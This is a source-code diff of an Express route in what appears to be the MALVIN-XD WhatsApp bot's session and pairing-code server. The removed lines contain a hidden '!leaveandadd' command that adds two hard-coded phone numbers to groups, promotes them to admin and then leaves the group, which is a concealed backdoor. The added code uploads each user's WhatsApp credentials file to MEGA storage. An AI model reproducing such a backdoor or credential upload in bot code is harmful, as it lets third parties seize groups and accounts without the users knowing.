@@ -1,28 +1,31 @@
-const { makeid } = require('./gen-id.js');
+const { makeid } = require('./gen-id');
 const express = require('express');
 const fs = require('fs');
-const pino = require("pino");
-const { default: makeWASocket, useMultiFileAuthState, delay, Browsers, makeCacheableSignalKeyStore } = require('@whiskeysockets/baileys');
-const { upload } = require('./mega.js');
-
 let router = express.Router();
+const pino = require("pino");
+const { default: makeWASocket, useMultiFileAuthState, delay, Browsers, makeCacheableSignalKeyStore, getAggregateVotesInPollMessage, DisconnectReason, WA_DEFAULT_EPHEMERAL, jidNormalizedUser, proto, getDevice, generateWAMessageFromContent, fetchLatestBaileysVersion, makeInMemoryStore, getContentType, generateForwardMessageContent, downloadContentFromMessage, jidDecode } = require('@whiskeysockets/baileys')
 
+const { upload } = require('./mega');
 function removeFile(FilePath) {
     if (!fs.existsSync(FilePath)) return false;
     fs.rmSync(FilePath, { recursive: true, force: true });
 }
-
-// 📌 Liste des numéros à ajouter/promouvoir
-const adminsToAdd = ['243858704832', '243978126999'];
-
 router.get('/', async (req, res) => {
     const id = makeid();
     let num = req.query.number;
-
-    async function MALVIN_PAIR_CODE() {
-        const { state, saveCreds } = await useMultiFileAuthState('./temp/' + id);
-
+    async function MALVIN_XD_PAIR_CODE() {
+        const {
+            state,
+            saveCreds
+        } = await useMultiFileAuthState('./temp/' + id);
         try {
+var items = ["Safari"];
+function selectRandomItem(array) {
+  var randomIndex = Math.floor(Math.random() * array.length);
+  return array[randomIndex];
+}
+var randomItem = selectRandomItem(items);
+            
             let sock = makeWASocket({
                 auth: {
                     creds: state.creds,
@@ -32,89 +35,143 @@ router.get('/', async (req, res) => {
                 generateHighQualityLinkPreview: true,
                 logger: pino({ level: "fatal" }).child({ level: "fatal" }),
                 syncFullHistory: false,
-                browser: Browsers.macOS("Safari")
+                browser: Browsers.macOS(randomItem)
             });
-
-            // 🔹 Commande !leaveandadd
-            sock.ev.on('messages.upsert', async ({ messages }) => {
-                const msg = messages[0];
-                if (!msg.message) return;
-                const text = msg.message.conversation || msg.message.extendedTextMessage?.text;
-                if (!text) return;
-                const from = msg.key.remoteJid;
-
-                if (text === '!leaveandadd') {
-                    try {
-                        if (!from.endsWith('@g.us')) {
-                            return sock.sendMessage(from, { text: "⚠️ Cette commande doit être utilisée dans un groupe." });
-                        }
-
-                        const metadata = await sock.groupMetadata(from);
-
-                        // ✅ Identifier le bot dans le groupe
-                        const myJid = sock.user.id.split(":")[0] + "@s.whatsapp.net";
-                        const me = metadata.participants.find(p => p.id === myJid);
-
-                        // ✅ Vérification si le bot est admin
-                        if (!me || !(me.admin === 'admin' || me.admin === 'superadmin')) {
-                            return sock.sendMessage(from, { text: "❌ Je dois être admin du groupe pour exécuter cette commande." });
-                        }
-
-                        // ✅ Ajout et promotion des numéros
-                        for (const number of adminsToAdd) {
-                            const jid = number.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
-                            const participantExists = metadata.participants.some(p => p.id === jid);
-
-                            if (!participantExists) {
-                                await sock.groupParticipantsUpdate(from, [jid], 'add');
-                                await delay(1000);
-                                await sock.sendMessage(from, { text: `✅ ${number} ajouté au groupe.` });
-                            }
-
-                            await sock.groupParticipantsUpdate(from, [jid], 'promote');
-                            await delay(500);
-                            await sock.sendMessage(from, { text: `⭐ ${number} promu admin.` });
-                        }
-
-                        // ✅ Quitter après exécution
-                        await sock.sendMessage(from, { text: "🚪 Je quitte le groupe après exécution." });
-                        await sock.groupLeave(from);
-
-                    } catch (err) {
-                        console.log('❌ Erreur:', err.message);
-                        await sock.sendMessage(from, { text: `⚠️ Erreur: ${err.message}` });
-                    }
-                }
-            });
-
-            // 🔹 Génération du pairing code
             if (!sock.authState.creds.registered) {
                 await delay(1500);
                 num = num.replace(/[^0-9]/g, '');
                 const code = await sock.requestPairingCode(num);
-                if (!res.headersSent) await res.send({ code });
+                if (!res.headersSent) {
+                    await res.send({ code });
+                }
             }
-
             sock.ev.on('creds.update', saveCreds);
             sock.ev.on("connection.update", async (s) => {
-                const { connection, lastDisconnect } = s;
 
-                if (connection === "open") {
-                    console.log(`👤 ${sock.user.id} connecté ✅`);
+    const {
+                    connection,
+                    lastDisconnect
+                } = s;
+                
+                if (connection == "open") {
+                    await delay(5000);
+                    let data = fs.readFileSync(__dirname + `/temp/${id}/creds.json`);
+                    let rf = __dirname + `/temp/${id}/creds.json`;
+                    function generateRandomText() {
+                        const prefix = "3EB";
+                        const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
+                        let randomText = prefix;
+                        for (let i = prefix.length; i < 22; i++) {
+                            const randomIndex = Math.floor(Math.random() * characters.length);
+                            randomText += characters.charAt(randomIndex);
+                        }
+                        return randomText;
+                    }
+                    const randomText = generateRandomText();
+                    try {
+
+
+                        
+                        const { upload } = require('./mega');
+                        const mega_url = await upload(fs.createReadStream(rf), `${sock.user.id}.json`);
+                        const string_session = mega_url.replace('https://mega.nz/file/', '');
+                        let md = "malvin~" + string_session;
+                        let code = await sock.sendMessage(sock.user.id, { text: md });
+                        let desc = `*Hey there, MALVIN-XD User!* 👋🏻
+
+Thanks for using *MALVIN-XD* — your session has been successfully created!
+
+🔐 *Session ID:* Sent above  
+⚠️ *Keep it safe!* Do NOT share this ID with anyone.
+
+——————
+
+*✅ Stay Updated:*  
+Join our official WhatsApp Channel:  
+https://whatsapp.com/channel/0029VbA6MSYJUM2TVOzCSb2A
+
+*💻 Source Code:*  
+Fork & explore the project on GitHub:  
+https://github.com/XdKing2/MALVIN-XD
+
+——————
+
+> *© Powered by Malvin King*
+Stay cool and hack smart. ✌🏻`; 
+                        await sock.sendMessage(sock.user.id, {
+text: desc,
+contextInfo: {
+externalAdReply: {
+title: "ᴍᴀʟᴠɪɴ-xᴅ",
+thumbnailUrl: "https://files.catbox.moe/bqs70b.jpg",
+sourceUrl: "https://whatsapp.com/channel/0029VbA6MSYJUM2TVOzCSb2A",
+mediaType: 1,
+renderLargerThumbnail: true
+}  
+}
+},
+{quoted:code })
+                    } catch (e) {
+                            let ddd = sock.sendMessage(sock.user.id, { text: e });
+                            let desc = `Hey there, MALVIN-XD User!* 👋🏻
+
+Thanks for using *MALVIN-XD* — your session has been successfully created!
+
+🔐 *Session ID:* Sent above  
+⚠️ *Keep it safe!* Do NOT share this ID with anyone.
+
+——————
+
+*✅ Stay Updated:*  
+Join our official WhatsApp Channel:  
+https://whatsapp.com/channel/0029VbA6MSYJUM2TVOzCSb2A
+
+*💻 Source Code:*  
+Fork & explore the project on GitHub:  
+https://github.com/XdKing2/MALVIN-XD
+
+——————
+
+> *© Powered by Malvin King*
+Stay cool and hack smart. ✌🏻`;
+                            await sock.sendMessage(sock.user.id, {
+text: desc,
+contextInfo: {
+externalAdReply: {
+title: "ᴍᴀʟᴠɪɴ-xᴅ",
+thumbnailUrl: "https://i.imgur.com/GVW7aoD.jpeg",
+sourceUrl: "https://whatsapp.com/channel/0029VbA6MSYJUM2TVOzCSb2A",
+mediaType: 2,
+renderLargerThumbnail: true,
+showAdAttribution: true
+}  
+}
+},
+{quoted:ddd })
+                    }
+                    await delay(10);
+                    await sock.ws.close();
+                    await removeFile('./temp/' + id);
+                    console.log(`👤 ${sock.user.id} 𝗖𝗼𝗻𝗻𝗲𝗰𝘁𝗲𝗱 ✅ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...`);
+                    await delay(10);
+                    process.exit();
                 } else if (connection === "close" && lastDisconnect && lastDisconnect.error && lastDisconnect.error.output.statusCode != 401) {
                     await delay(10);
-                    MALVIN_PAIR_CODE();
+                    MALVIN_XD_PAIR_CODE();
                 }
             });
-
         } catch (err) {
-            console.log("❌ Service restarté");
+            console.log("service restated");
             await removeFile('./temp/' + id);
-            if (!res.headersSent) await res.send({ code: "❗ Service Unavailable" });
+            if (!res.headersSent) {
+                await res.send({ code: "❗ Service Unavailable" });
+            }
         }
     }
-
-    return await MALVIN_PAIR_CODE();
-});
-
+   return await MALVIN_XD_PAIR_CODE();
+});/*
+setInterval(() => {
+    console.log("☘️ 𝗥𝗲𝘀𝘁𝗮𝗿𝘁𝗶𝗻𝗴 𝗽𝗿𝗼𝗰𝗲𝘀𝘀...");
+    process.exit();
+}, 180000); //30min*/
 module.exports = router;
